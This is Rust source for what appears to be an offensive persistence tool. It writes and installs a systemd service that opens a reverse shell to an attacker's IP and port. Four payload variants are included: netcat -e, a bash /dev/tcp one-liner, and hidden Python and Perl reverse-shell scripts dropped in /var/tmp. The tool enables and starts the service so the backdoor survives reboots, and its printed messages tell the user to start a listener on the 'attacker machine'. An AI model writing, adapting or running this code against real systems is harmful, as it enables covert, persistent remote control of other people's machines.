use std::process::Command;
use std::fs::File;
use std::io::prelude::*;
use std::io;

use crate::sanitizer;

pub fn write_service (mut service_name: String, port: String, source_ip: String, choice: u8) -> std::io::Result<()> {
    let port_nc = port.clone();

    if service_name.contains(".service") {

    }
    else {
        service_name.push_str(".service")
    }

    if choice == 1 {
        let mut payload = ["ExecStart=nc ", &source_ip].concat();
        payload.push_str(" ");
        payload.push_str(&port);
        payload.push_str(" -e /bin/bash\n");

        let mut file = File::create(&service_name)?;
        file.write_all(b"[Unit]\n")?;
        file.write_all(b"Description=My Custom Service\n")?;
        file.write_all(b"After=network-online.target\n\n")?;
        file.write_all(b"[Service]\n")?;
        file.write_all(b"ExecStartPre=/bin/sleep 15\n")?;
        file.write_all(payload.as_bytes())?;
        file.write_all(b"Type=simple\n\n")?;
        file.write_all(b"[Install]\n")?;
        file.write_all(b"WantedBy=default.target\n")?;        

    }
    //Building the process infection by the usage of /dev/tcp reverse shell command
    else if choice == 2 {
        let mut payload = ["ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/", &source_ip].concat();
        payload.push_str("/");
        payload.push_str(&port);
        payload.push_str(" 0>&1'\n");

        let mut file = File::create(&service_name)?;
        file.write_all(b"[Unit]\n")?;
        file.write_all(b"Description=My Custom Service\n")?;
        file.write_all(b"After=network-online.target\n\n")?;
        file.write_all(b"[Service]\n")?;
        file.write_all(b"ExecStartPre=/bin/sleep 15\n")?;
        file.write_all(payload.as_bytes())?;
        file.write_all(b"Type=simple\n\n")?;
        file.write_all(b"[Install]\n")?;
        file.write_all(b"WantedBy=default.target\n")?;
        

    }
    //Building the process infection by the usage of reverse shell script in python
    else if choice == 3 {
        let result =write_shell_pyfile(port, source_ip);
        sanitizer::sanitize_return_fn(result);
        let filename = "/var/tmp/.shell.py";
        let payload = ["ExecStart=python ", filename].concat();

        let mut file = File::create(&service_name)?;
        file.write_all(b"[Unit]\n")?;
        file.write_all(b"Description=My Custom Service\n")?;
        file.write_all(b"After=network-online.target\n\n")?;
        file.write_all(b"[Service]\n")?;
        file.write_all(b"ExecStartPre=/bin/sleep 15\n")?;
        file.write_all(payload.as_bytes())?;
        file.write_all(b"\n")?;
        file.write_all(b"Type=simple\n\n")?;
        file.write_all(b"[Install]\n")?;
        file.write_all(b"WantedBy=default.target\n")?;        
        

    }
    //Building the process infection by the usage of reverse shell script in perl
    else if choice == 4 {
        let result = write_shell_perl(port, source_ip);
        sanitizer::sanitize_return_fn(result);
        let filename = "/var/tmp/.shell.pl";
        let payload = ["ExecStart=perl ", filename].concat();
        let mut file = File::create(&service_name)?;

        file.write_all(b"[Unit]\n")?;
        file.write_all(b"Description=My Custom Service\n")?;
        file.write_all(b"After=network-online.target\n\n")?;
        file.write_all(b"[Service]\n")?;
        file.write_all(b"ExecStartPre=/bin/sleep 15\n")?;
        file.write_all(payload.as_bytes())?;
        file.write_all(b"\n")?;
        file.write_all(b"Type=simple\n\n")?;
        file.write_all(b"[Install]\n")?;
        file.write_all(b"WantedBy=default.target\n")?;
        

    }
    

    create_service(service_name, port_nc);


    Ok(())



}

fn create_service (service_name: String, port: String) {

    //Check if service exist
    sanitizer::sanitize_service_exist(&service_name);

    //Set chmod command and chmod the service file before to move it.
    let chmod = ["chmod 777 ", &service_name].concat();
    let mut output = Command::new("sh")
    .arg("-c")
    .arg(&chmod)
    .output()
    .expect("Failed to execute command");

    let mut err_string = String::from_utf8_lossy(&output.stderr).to_string();

    sanitizer::sanitize_system_command(&err_string);

    

    //Set the mv command to move the service
    let mut mv_service = ["mv ", &service_name].concat();
    mv_service.push_str(" /etc/systemd/system/");
    mv_service.push_str(&service_name);

    //Move the service file in the necessary directory
    output = Command::new("sh")
    .arg("-c")
    .arg(&mv_service)
    .output()
    .expect("Failed to execute command");

    err_string = String::from_utf8_lossy(&output.stderr).to_string();

    sanitizer::sanitize_system_command(&err_string);

    // Check if restorerecon exist. If it exist, SeLinux is enabled on the system
    let command_to_check = String::from("restorecon");
    let command_exist = sanitizer::sanitize_command_exist(&command_to_check);

    //If SeLinux is enabled, we restorerecon command to give right to systemd to read the service
    if command_exist == true {
        let mut restorecon = ["restorecon ", "/etc/systemd/system/"].concat();
        restorecon.push_str(&service_name);
        output = Command::new("sh")
        .arg("-c")
        .arg(&restorecon)
        .output()
        .expect("Failed to execute command");
        
        err_string = String::from_utf8_lossy(&output.stderr).to_string();

        sanitizer::sanitize_system_command(&err_string);

    }

    // Set daemon-reload command
    let mut daemon_reload = "systemctl daemon-reload";

    output = Command::new("sh")
    .arg("-c")
    .arg(&daemon_reload)
    .output()
    .expect("Failed to execute command");

    err_string = String::from_utf8_lossy(&output.stderr).to_string();

    sanitizer::sanitize_system_command(&err_string);
    
    // Set service enabling command
    let systemd_enable = ["systemctl enable ", &service_name].concat();

    //Enable the service with systemd command
    output = Command::new("sh")
    .arg("-c")
    .arg(&systemd_enable)
    .output()
    .expect("Failed to execute command");

    err_string = String::from_utf8_lossy(&output.stderr).to_string();

    sanitizer::sanitize_ex_stderr(&err_string);

    // Set daemon-reload command
    daemon_reload = "systemctl daemon-reload";

    output = Command::new("sh")
    .arg("-c")
    .arg(&daemon_reload)
    .output()
    .expect("Failed to execute command");

    err_string = String::from_utf8_lossy(&output.stderr).to_string();

    sanitizer::sanitize_system_command(&err_string);

    //Set stop service command
    let systemctl_stop_service = ["systemctl stop ", &service_name].concat();
    
    //Stop the malicious service
    output = Command::new("sh")
    .arg("-c")
    .arg(&systemctl_stop_service)
    .output()
    .expect("Failed to execute command");

    err_string = String::from_utf8_lossy(&output.stderr).to_string();

    sanitizer::sanitize_system_command(&err_string);

    //Set start service command
    let systemctl_start_service = ["systemctl start ", &service_name].concat();

    let mut input = String::new();
    let mut ok = String::new();
    while &ok != "ok" {
        println!("\x1b[31mAre you ready to get access with the backdoor ? \n");
        println!("On your 'Attacker machine' please put this nc command before to continue : nc -lvp {} \n", port);
        println!("When you are ready, please put 'ok' in lowercase");
        io::stdin().read_line(&mut input).expect("Error while reading parameter !");
        input = input.trim_end_matches('\n').to_string();
        ok = input.clone();
        input.clear();
    }

    println!("\nGreat ! Please wait 30 sec to have shell in your 'Attacker machine' terminal, and your backdoor will be installed correctly\x1b[0m\n");
    //Start the malicious service
    output = Command::new("sh")
    .arg("-c")
    .arg(&systemctl_start_service)
    .output()
    .expect("Failed to execute command");

    err_string = String::from_utf8_lossy(&output.stderr).to_string();

    sanitizer::sanitize_system_command(&err_string);

    println!("\x1b[36mBackdoor is installed and you have a reverse shell ! When the service will restart or the machine will reboot you will have a new reverse shell !\n");
    println!("But, don't forget to execute this command before: nc -lvp {}\x1b[0m\n", port);


}

fn write_shell_pyfile(port: String, source_ip: String) -> std::io::Result<()>{
    let mut file = File::create("/var/tmp/.shell.py")?;
    file.write_all(b"import socket,subprocess,os;\n")?;
    file.write_all(b"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\n")?;
    let mut v_ip = ["v_ip='", &source_ip].concat();
    v_ip.push_str("';\n");
    file.write_all(v_ip.as_bytes())?;
    let mut v_port = ["s.connect((v_ip,", &port].concat();
    v_port.push_str("));\n");
    file.write_all(v_port.as_bytes())?;
    file.write_all(b"os.dup2(s.fileno(),0);\n")?;
    file.write_all(b"os.dup2(s.fileno(),1);\n")?;
    file.write_all(b"os.dup2(s.fileno(),2);\n")?;
    file.write_all(b"v_shell_path='/usr/bin/bash';\n")?;
    file.write_all(b"v_shell_value='-i';\n")?;
    file.write_all(b"p=subprocess.call([v_shell_path,v_shell_value]);\n")?;

    Ok(())
}

fn write_shell_perl(port:String, source_ip: String) -> std::io::Result<()>{
    let mut file = File::create("/var/tmp/.shell.pl")?;
    file.write_all(b"use Socket;\n")?;
    let mut v_ip = ["$i='", &source_ip].concat();
    v_ip.push_str("';\n");
    file.write_all(v_ip.as_bytes())?;
    let  mut v_port = ["$p=", &port].concat();
    v_port.push_str(";\n");
    file.write_all(v_port.as_bytes())?;
    file.write_all(b"socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));\n")?;
    file.write_all(b"if(connect(S,sockaddr_in($p,inet_aton($i)))){\n")?;
    file.write_all(b"open(STDIN,'>&S');\n")?;
    file.write_all(b"open(STDOUT,'>&S');\n")?;
    file.write_all(b"open(STDERR,'>&S');\n")?;
    file.write_all(b"exec('/usr/bin/bash -i');\n")?;
    file.write_all(b"};\n")?;

    Ok(())
}
